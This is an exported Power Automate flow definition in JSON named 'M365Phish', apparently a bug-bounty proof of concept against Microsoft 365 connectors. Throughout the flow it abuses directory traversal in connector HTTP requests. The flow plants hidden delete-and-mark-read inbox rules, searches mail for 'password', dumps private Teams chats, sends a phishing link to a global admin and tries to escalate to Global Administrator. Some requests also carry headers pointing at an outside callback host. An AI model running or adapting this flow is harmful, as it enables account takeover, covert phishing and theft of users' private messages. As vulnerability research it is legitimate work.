{"name":"59095fc9-f92b-4971-a05e-66d72631cb2d","id":"/providers/Microsoft.Flow/flows/59095fc9-f92b-4971-a05e-66d72631cb2d","type":"Microsoft.Flow/flows","properties":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_logicflows","displayName":"M365Phish - Power Automate","definition":{"metadata":{"workflowEntityId":null,"processAdvisorMetadata":null,"flowclientsuspensionreason":"None","flowclientsuspensiontime":null,"flowclientsuspensionreasondetails":null,"creator":{"id":"78dba543-9f7f-4eb8-aa2a-e185f44690c7","type":"User","tenantId":"51fc9f8f-fed1-4133-84b8-bbbe4de0b38d"},"provisioningMethod":"FromDefinition","failureAlertSubscription":true,"clientLastModifiedTime":"2023-01-03T15:14:14.0754309Z"},"$schema":"https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#","contentVersion":"1.0.0.0","parameters":{"$connections":{"defaultValue":{},"type":"Object"},"$authentication":{"defaultValue":{},"type":"SecureObject"}},"triggers":{"manual":{"metadata":{"operationMetadataId":"686da310-e079-4e7b-8b57-3b7477ecc32f"},"type":"Request","kind":"PowerAppV2","inputs":{"schema":{"type":"object","properties":{},"required":[]}}}},"actions":{"Scope_-_Run_some_unexpected_actions_":{"actions":{"Compose_-_Malicious_PowerApp_URL":{"runAfter":{},"metadata":{"operationMetadataId":"bc37781a-70cd-416a-9a76-943c899e0f75"},"type":"Compose","inputs":"https://apps.powerapps.com/play/e/default-51fc9f8f-fed1-4133-84b8-bbbe4de0b38d/a/334478d1-fb2d-42a0-993c-6dadc029f525?tenantId=51fc9f8f-fed1-4133-84b8-bbbe4de0b38d"},"Send_an_HTTP_request_-_Creating_mail_rule_w_User_connector":{"runAfter":{"Send_an_HTTP_request_V2_-_creating_mail_rule_w_Groups_Connector":["Succeeded","Failed"]},"metadata":{"operationMetadataId":"699550cb-568c-4d7c-b425-1df4c5d9cc05"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365users","connectionName":"shared_office365users","operationId":"HttpRequest"},"parameters":{"Uri":"https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules","Method":"POST","Body":"{      \n    \"displayName\": \"Malicious Rule: HTTP User Action\",      \n    \"sequence\": 1,\n    \"isEnabled\": true,\n    \"conditions\": {\n        \"bodyOrSubjectContains\": [\n          \"@{outputs('Compose_-_Malicious_PowerApp_URL')}\"\n        ]\n     },\n     \"actions\": {\n        \"delete\":true,\n        \"markAsRead\": true,\n        \"stopProcessingRules\": true\n     }    \n}","ContentType":"application/json","CustomHeader1":"X-Host: cdz2wn22vtc0000fd92ggg9tqkoyyyyyb.xyzcollab.com","CustomHeader2":"Host: cdz2wn22vtc0000fd92ggg9tqkoyyyyyb.xyzcollab.com","CustomHeader3":"Forwarded-For: cdz2wn22vtc0000fd92ggg9tqkoyyyyyb.xyzcollab.com","CustomHeader4":"X-Forwarded-For: cdz2wn22vtc0000fd92ggg9tqkoyyyyyb.xyzcollab.com"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}},"Send_an_HTTP_request_V2_-_creating_mail_rule_w_Groups_Connector":{"runAfter":{"Send_an_HTTP_request_-_Demonstrate_control_over_OneDrive":["Succeeded","Failed"]},"metadata":{"operationMetadataId":"981169e6-4623-4d53-94a1-5cc99c6cb09a"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365groups","connectionName":"shared_office365groups","operationId":"HttpRequestV2"},"parameters":{"Uri":"https://graph.microsoft.com/v1.0/groups/../me/mailFolders/inbox/messageRules","Method":"POST","Body":"{      \n    \"displayName\": \"Malicious Rule: HTTP Group Action\",      \n    \"sequence\": 1,\n    \"isEnabled\": true,\n    \"conditions\": {\n        \"bodyOrSubjectContains\": [\n          \"@{outputs('Compose_-_Malicious_PowerApp_URL')}\"\n        ]\n     },\n     \"actions\": {\n        \"delete\":true,\n        \"markAsRead\": true,\n        \"stopProcessingRules\": true\n     }    \n}","ContentType":"application/json"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}},"Send_an_HTTP_request_-_Demonstrate_control_over_OneDrive":{"runAfter":{"Scope_-_Search_Outlook_for_Sensitive_Emails":["Succeeded","Failed"]},"metadata":{"operationMetadataId":"8cbed6f5-bd53-4527-8454-d48ce3ded560"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365","connectionName":"shared_office365_1","operationId":"HttpRequest"},"parameters":{"Uri":"https://graph.microsoft.com/v1.0/me/messages/../drive/items/root:/Created_with_Outlook_Action.ttxt:/content","Method":"PUT","Body":"meowmix","ContentType":"text/plain"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}},"Scope_-_Get_Private_Teams_chats":{"actions":{"Get_a_team_-_dump_chats_(including_oneOnOne_chats)":{"runAfter":{},"metadata":{"operationMetadataId":"3f1acca5-6c13-4cf4-bc66-b3a0e58d629e"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_teams","connectionName":"shared_teams_1","operationId":"GetTeam"},"parameters":{"teamId":"x/../../chats"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}},"description":"Remove filter + top to get all chats: ?$filter=chatType eq 'onOnOne'&$top=1"},"Apply_to_each_-_chat":{"foreach":"@body('Get_a_team_-_dump_chats_(including_oneOnOne_chats)')?['value']","actions":{"Apply_to_each_-_message":{"foreach":"@body('Get_a_team_-_get_messages_from_chat')?['value']","actions":{"Compose_-_DEBUG_OUTPUT_-_message":{"runAfter":{},"metadata":{"operationMetadataId":"56659491-32c8-4e99-a2b8-5d5aa5e598f8"},"type":"Compose","inputs":"@item()"},"Compose":{"runAfter":{"Compose_-_DEBUG_OUTPUT_-_message":["Succeeded"]},"metadata":{"operationMetadataId":"738ef1e7-f38e-469f-8531-2578bc3c4730"},"type":"Compose","inputs":"@item()?['body']['content']"}},"runAfter":{"Get_a_team_-_get_messages_from_chat":["Succeeded"]},"metadata":{"operationMetadataId":"7cceaaaf-dac2-42d5-8287-c38236eacd34"},"type":"Foreach"},"Compose_-_DEBUG_OUTPUT_-_chat":{"runAfter":{},"metadata":{"operationMetadataId":"0697a14e-04f7-4522-a291-b38f31899386"},"type":"Compose","inputs":"@item()"},"Get_a_team_-_get_messages_from_chat":{"runAfter":{"Compose_-_DEBUG_OUTPUT_-_chat":["Succeeded"]},"metadata":{"operationMetadataId":"22a5bba3-3f35-4291-b241-e339783c508e"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_teams","connectionName":"shared_teams_1","operationId":"GetTeam"},"parameters":{"teamId":"@concat('x/../../chats/', item()?['id'], '/messages')"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}}},"runAfter":{"Get_a_team_-_dump_chats_(including_oneOnOne_chats)":["Succeeded"]},"metadata":{"operationMetadataId":"5a37b975-2477-4746-b85b-486ea71f035a"},"type":"Foreach","description":"body() allows parsing unexpected \"Get a team\" response"}},"runAfter":{"Scope_-_Directory_Traversal_with_trailing_Hash_segment":["Succeeded","Failed"]},"metadata":{"operationMetadataId":"430b5b11-17df-4fbc-9902-b595eb4d8038"},"type":"Scope"},"Scope_-_Search_Outlook_for_Sensitive_Emails":{"actions":{"Send_an_HTTP_request_-_filter_emails_with_body_containing_'password'":{"runAfter":{},"metadata":{"operationMetadataId":"0e79bdb9-1e67-4b20-b8d6-ac80553be006"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365","connectionName":"shared_office365_1","operationId":"HttpRequest"},"parameters":{"Uri":"https://graph.microsoft.com/v1.0/me/messages?$filter=contains(body/content, 'password')","Method":"GET","ContentType":"application/json"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}},"Create_HTML_table":{"runAfter":{"Send_an_HTTP_request_-_filter_emails_with_body_containing_'password'":["Succeeded"]},"metadata":{"operationMetadataId":"480b7638-d4fa-4a31-aec8-bff1113550d3"},"type":"Table","inputs":{"from":"@body('Send_an_HTTP_request_-_filter_emails_with_body_containing_''password''')","format":"HTML","columns":[{"header":"subject","value":"@item()?['subject']"},{"header":"body","value":"@item()['body']['content']"},{"header":"to","value":"@item()?['toRecipients']"},{"header":"from","value":"@item()?['from']?['emailAddress']?['address']"}]}}},"runAfter":{"Send_an_email_(V2)_-_hardcode_phishing_to_secondary_target":["Succeeded","Failed"]},"metadata":{"operationMetadataId":"b4562570-b340-431f-b138-29e2e4858949"},"type":"Scope"},"Send_an_email_(V2)_-_hardcode_phishing_to_secondary_target":{"runAfter":{"Compose_-_Malicious_PowerApp_URL":["Succeeded"]},"metadata":{"operationMetadataId":"f828a69e-67b3-4b5f-b90a-fb013b06c1e2"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365","connectionName":"shared_office365_1","operationId":"SendEmailV2"},"parameters":{"emailMessage/To":"global.admin@BugBountyM365Phish.onmicrosoft.com","emailMessage/Subject":"What do you think about this app?","emailMessage/Body":"<p>@{outputs('Compose_-_Malicious_PowerApp_URL')}</p>","emailMessage/Importance":"Normal"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}},"description":"Drop .lnk or malicious .doc?  SharePoint HTTP action required to stomp Modified/Created Dates"},"Scope_-_Directory_Traversal_with_trailing_Hash_segment":{"actions":{"Send_an_HTTP_request_-_1_Base_request_(FAILED)":{"runAfter":{},"metadata":{"operationMetadataId":"4e7f308e-a63b-4759-bfc7-8986bb580327"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365","connectionName":"shared_office365","operationId":"HttpRequest"},"parameters":{"Uri":"https://graph.microsoft.com/v1.0/groups/a6641066-ce7a-4fed-836f-4d2f8f52ca66/members","Method":"GET","ContentType":"application/json"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}},"description":"Outlook Connector adding members to group, not rule of least privilege. "},"Send_an_HTTP_request_-_2_Directory_Traversal_(FAILED)":{"runAfter":{"Send_an_HTTP_request_-_1_Base_request_(FAILED)":["Succeeded","Failed"]},"metadata":{"operationMetadataId":"4e7f308e-a63b-4759-bfc7-8986bb580327"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365","connectionName":"shared_office365","operationId":"HttpRequest"},"parameters":{"Uri":"https://graph.microsoft.com/v1.0/me/messages/../../groups/a6641066-ce7a-4fed-836f-4d2f8f52ca66/members","Method":"GET","ContentType":"application/json"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}},"description":"Outlook Connector adding members to group, not rule of least privilege. "},"Send_an_HTTP_request_-_3_Directory_Traversal_+_Trailing_with_Hash_(SUCCESS)":{"runAfter":{"Send_an_HTTP_request_-_2_Directory_Traversal_(FAILED)":["Succeeded","Failed"]},"metadata":{"operationMetadataId":"4e7f308e-a63b-4759-bfc7-8986bb580327"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365","connectionName":"shared_office365","operationId":"HttpRequest"},"parameters":{"Uri":"https://graph.microsoft.com/v1.0/me/messages/../../groups/a6641066-ce7a-4fed-836f-4d2f8f52ca66/members#/me/messages","Method":"GET","ContentType":"application/json"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}},"description":"Outlook Connector adding members to group, not rule of least privilege. "}},"runAfter":{"Send_an_HTTP_request_-_Creating_mail_rule_w_User_connector":["Succeeded","Failed"]},"metadata":{"operationMetadataId":"b8c9f456-59f4-4084-b782-0ed1431f6630"},"type":"Scope"}},"runAfter":{"Scope_-_Further_Testing":["Succeeded","TimedOut","Skipped","Failed"]},"metadata":{"operationMetadataId":"660027c5-9e10-4b59-877f-ed7f6e95e243"},"type":"Scope"},"Scope_-_Variables":{"actions":{"Get_my_profile_(V2)":{"runAfter":{},"metadata":{"operationMetadataId":"2f8ac255-941b-4239-be3a-2191b5f30176"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365users","connectionName":"shared_office365users","operationId":"MyProfile_V2"},"parameters":{},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}},"Compose_-_Get_Domain_from_Email":{"runAfter":{"Get_my_profile_(V2)":["Succeeded"]},"metadata":{"operationMetadataId":"5e9a29d6-b442-4bf2-86dd-1bf043d1ff3c"},"type":"Compose","inputs":"@first(split(last(split(outputs('Get_my_profile_(V2)')?['body/userPrincipalName'], '@')), '.onmicrosoft.com'))"}},"runAfter":{"Compose_2":["Succeeded"]},"metadata":{"operationMetadataId":"d9efdccd-53ca-45c3-9e65-d64b798ed0e1"},"type":"Scope"},"Scope_-_Test_Connections_Context":{"actions":{"Send_an_HTTP_request_to_SharePoint":{"runAfter":{},"metadata":{"operationMetadataId":"4eae2566-05dc-482e-84e2-ba9a02dd0514"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_sharepointonline","connectionName":"shared_sharepointonline","operationId":"HttpRequest"},"parameters":{"dataset":"https://@{outputs('Compose_-_Get_Domain_from_Email')}.sharepoint.com","parameters/method":"GET","parameters/uri":"_api/SP.UserProfiles.PeopleManager/GetMyProperties?$select=AccountName"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}},"Send_an_HTTP_request_-_THIS_REQUEST_WILL_FAIL":{"runAfter":{"Send_an_HTTP_request_to_SharePoint":["Succeeded","Failed"]},"metadata":{"operationMetadataId":"3f35e1ef-38cf-4630-b150-412d0a7482f1"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365groupsmail","connectionName":"shared_office365groupsmail","operationId":"HttpRequest"},"parameters":{"Uri":"https://graph.microsoft.com/v1.0/me/messages?$select=subject,from,toRecipients","Method":"GET","ContentType":"application/json"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}},"Send_an_HTTP_request_-_DIRECTORY_TRAVERSAL_BYPASS":{"runAfter":{"Send_an_HTTP_request_-_THIS_REQUEST_WILL_FAIL":["Failed"]},"metadata":{"operationMetadataId":"3f35e1ef-38cf-4630-b150-412d0a7482f1"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365groupsmail","connectionName":"shared_office365groupsmail","operationId":"HttpRequest"},"parameters":{"Uri":"https://graph.microsoft.com/v1.0/groups/../me/messages?$select=subject,from,toRecipients","Method":"GET","ContentType":"application/json"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}}},"runAfter":{"Scope_-_Variables":["Succeeded"]},"metadata":{"operationMetadataId":"59670be5-887e-43fe-9d26-9dbb0780477e"},"type":"Scope","description":"Testing Non-Premium Connectors; demonstrating control of email. Premium connectors should be tested too. Of specific concern would be connectors like the DevOps HTTP action and any action that run under the context of the user who executed the flow. "},"Scope_-_Further_Testing":{"actions":{"Send_an_HTTP_request_-_Accessing_OneNotes_(FAILED)":{"runAfter":{},"metadata":{"operationMetadataId":"699550cb-568c-4d7c-b425-1df4c5d9cc05"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365users","connectionName":"shared_office365users","operationId":"HttpRequest"},"parameters":{"Uri":"https://graph.microsoft.com/v1.0/me/messages/../onenote/notebooks","Method":"GET","ContentType":"application/json","CustomHeader1":"X-Host: cdz2wn22vtc0000fd92ggg9tqkoyyyyyb.xyzcollab.com","CustomHeader2":"Host: cdz2wn22vtc0000fd92ggg9tqkoyyyyyb.xyzcollab.com","CustomHeader3":"Forwarded-For: cdz2wn22vtc0000fd92ggg9tqkoyyyyyb.xyzcollab.com","CustomHeader4":"X-Forwarded-For: cdz2wn22vtc0000fd92ggg9tqkoyyyyyb.xyzcollab.com"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}},"Send_an_HTTP_request_-_Getting_Password_Permissions_(FAILED)":{"runAfter":{"Send_an_HTTP_request_-_Accessing_OneNotes_(FAILED)":["Succeeded","Failed"]},"metadata":{"operationMetadataId":"699550cb-568c-4d7c-b425-1df4c5d9cc05"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365users","connectionName":"shared_office365users","operationId":"HttpRequest"},"parameters":{"Uri":"https://graph.microsoft.com/v1.0/me/messages/../authentication/passwordMethods","Method":"GET","ContentType":"application/json","CustomHeader1":"X-Host: cdz2wn22vtc0000fd92ggg9tqkoyyyyyb.xyzcollab.com","CustomHeader2":"Host: cdz2wn22vtc0000fd92ggg9tqkoyyyyyb.xyzcollab.com","CustomHeader3":"Forwarded-For: cdz2wn22vtc0000fd92ggg9tqkoyyyyyb.xyzcollab.com","CustomHeader4":"X-Forwarded-For: cdz2wn22vtc0000fd92ggg9tqkoyyyyyb.xyzcollab.com"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}},"description":"If successful, would try to reset password: https://learn.microsoft.com/en-us/graph/api/authenticationmethod-resetpassword?view=graph-rest-1.0&tabs=http"},"Scope_-_Elevate_Global_Admin_via._Groups_(FAILED)":{"actions":{"Send_an_HTTP_request_-_Enum_roleManagement_(FAILED)":{"runAfter":{},"metadata":{"operationMetadataId":"0084c812-47c4-4b26-91ee-c9c92e106f2f"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365groups","connectionName":"shared_office365groups","operationId":"HttpRequest"},"parameters":{"Uri":"https://graph.microsoft.com/v1.0/me/messages/../../roleManagement/directory/roleDefinitions?$filter=displayName eq 'Global Administrator'","Method":"GET","ContentType":"application/json"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}},"Send_an_HTTP_request_-_Add_to_Global_Admin_group_via_Outlook_Connector_(FAILED)":{"runAfter":{"Send_an_HTTP_request_-_Enum_Global_Admin_Role_Assignments_(FAILED)":["Succeeded","Failed"]},"metadata":{"operationMetadataId":"4e7f308e-a63b-4759-bfc7-8986bb580327"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365","connectionName":"shared_office365","operationId":"HttpRequest"},"parameters":{"Uri":"https://graph.microsoft.com/v1.0/me/messages/../../groups/a6641066-ce7a-4fed-836f-4d2f8f52ca66/members/$ref#/me/messages","Method":"POST","Body":"{\n  \"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/78dba543-9f7f-4eb8-aa2a-e185f44690c7\"\n}","ContentType":"application/json"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}},"description":"Outlook Connector adding members to group, not rule of least privilege. "},"Send_an_HTTP_request_-_Enum_Global_Admin_Role_Assignments_(FAILED)":{"runAfter":{"Send_an_HTTP_request_-_Get_Role_(FAILED)":["Succeeded","Failed"]},"metadata":{"operationMetadataId":"bffd4db5-e7c6-45db-ab22-48a3953f7dd4"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365users","connectionName":"shared_office365users","operationId":"HttpRequest"},"parameters":{"Uri":"https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?`$filter=roleDefinitionId eq '@{body('Send_an_HTTP_request_-_Get_Role_(FAILED)')?['id']}'&`$expand=principal","Method":"GET","ContentType":"application/json"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}},"Send_an_HTTP_request_-_Get_Role_(FAILED)":{"runAfter":{"Send_an_HTTP_request_-_Enum_Role_Assignments_(FAILED)":["Succeeded","Failed"]},"metadata":{"operationMetadataId":"b9d946dd-b282-4482-b201-9f0aa27e4c4f"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365users","connectionName":"shared_office365users","operationId":"HttpRequest"},"parameters":{"Uri":"https://graph.microsoft.com/v1.0/me/messages/../../groups/a6641066-ce7a-4fed-836f-4d2f8f52ca66/members/$ref#/me/messages","Method":"POST","Body":"{\n  \"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/78dba543-9f7f-4eb8-aa2a-e185f44690c7\"\n}","ContentType":"application/json"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}},"Send_an_HTTP_request_-_Enum_Role_Assignments_(FAILED)":{"runAfter":{"Send_an_HTTP_request_-_Enum_roleManagement_(FAILED)":["Succeeded","Failed"]},"metadata":{"operationMetadataId":"699550cb-568c-4d7c-b425-1df4c5d9cc05"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_office365users","connectionName":"shared_office365users","operationId":"HttpRequest"},"parameters":{"Uri":"https://graph.microsoft.com/v1.0/me/messages/../../roleManagement/directory/roleAssignments","Method":"GET","ContentType":"application/json","CustomHeader1":"X-Host: cdz2wn22vtc0000fd92ggg9tqkoyyyyyb.xyzcollab.com","CustomHeader2":"Host: cdz2wn22vtc0000fd92ggg9tqkoyyyyyb.xyzcollab.com","CustomHeader3":"Forwarded-For: cdz2wn22vtc0000fd92ggg9tqkoyyyyyb.xyzcollab.com","CustomHeader4":"X-Forwarded-For: cdz2wn22vtc0000fd92ggg9tqkoyyyyyb.xyzcollab.com"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}},"description":"If successful, would try to reset password: https://learn.microsoft.com/en-us/azure/active-directory/roles/custom-assign-graph"}},"runAfter":{"Send_an_HTTP_request_-_Getting_Password_Permissions_(FAILED)":["Succeeded","Failed"]},"metadata":{"operationMetadataId":"bb416f2d-b8ed-47cf-9a47-543f4ff5bcaf"},"type":"Scope"}},"runAfter":{"Scope_-_Test_Connections_Context":["Succeeded"]},"metadata":{"operationMetadataId":"7edbb95f-523b-4f34-a6a0-33fbaec956fe"},"type":"Scope","description":"Since the /groups endpoints accepted /me requests through directory traversal, I tried a few more tests which all failed. Depending on the scopes of the token (invisible to me) some of these actions may be possible in other connections."},"Compose_2":{"runAfter":{},"metadata":{"operationMetadataId":"9aef32ac-30a1-4d6a-959d-5e82e567f0f7"},"type":"Compose","inputs":"@workflow()"}},"outputs":{}},"connectionReferences":{"shared_office365users":{"connectionName":"shared-office365user-71412c91-fa65-47c2-87ed-8a242243001d","source":"Invoker","id":"/providers/Microsoft.PowerApps/apis/shared_office365users","tier":"NotSpecified"},"shared_office365groups":{"connectionName":"shared-office365grou-975e9f0e-2790-48d8-88b3-d685af39e370","source":"Invoker","id":"/providers/Microsoft.PowerApps/apis/shared_office365groups","tier":"NotSpecified"},"shared_office365_1":{"connectionName":"shared-office365-6665a5be-9925-4910-adb4-d8648f4a6b73","source":"Invoker","id":"/providers/Microsoft.PowerApps/apis/shared_office365","tier":"NotSpecified"},"shared_teams_1":{"connectionName":"shared-teams-17031457-b3e6-4948-8456-55fb9a06940b","source":"Invoker","id":"/providers/Microsoft.PowerApps/apis/shared_teams","tier":"NotSpecified"},"shared_office365":{"connectionName":"shared-office365-6665a5be-9925-4910-adb4-d8648f4a6b73","source":"Invoker","id":"/providers/Microsoft.PowerApps/apis/shared_office365","tier":"NotSpecified"},"shared_sharepointonline":{"connectionName":"shared-sharepointonl-5778131d-6137-4862-b0b9-2d2778d22940","source":"Invoker","id":"/providers/Microsoft.PowerApps/apis/shared_sharepointonline","tier":"NotSpecified"},"shared_office365groupsmail":{"connectionName":"shared-office365grou-051f1844-4551-41b0-8352-651958165f7a","source":"Invoker","id":"/providers/Microsoft.PowerApps/apis/shared_office365groupsmail","tier":"NotSpecified"}},"flowFailureAlertSubscribed":false,"isManaged":false}}